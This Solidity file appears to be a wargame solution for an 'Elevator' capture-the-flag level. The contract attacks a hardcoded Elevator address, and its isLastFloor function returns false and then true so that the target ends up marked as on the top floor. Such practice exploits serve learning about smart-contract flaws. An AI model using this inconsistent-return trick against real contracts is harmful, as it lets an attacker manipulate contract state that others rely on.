// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BrokenElevator {

    Elevator level11 = Elevator(0xc97153EF1244388e24FA314c4DF4940Fb6cAAe23);
    bool public counter = false; // counter variable initially set to false

    function gotoFloor() public {
        level11.goTo(1);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        if (!counter) { // if (true)
            counter = true; // change the counter to true
            return false; // first return value will be false
        } else {
            counter = false; // change the counter to false
            return true; // second return value will be true
        }
    }
}
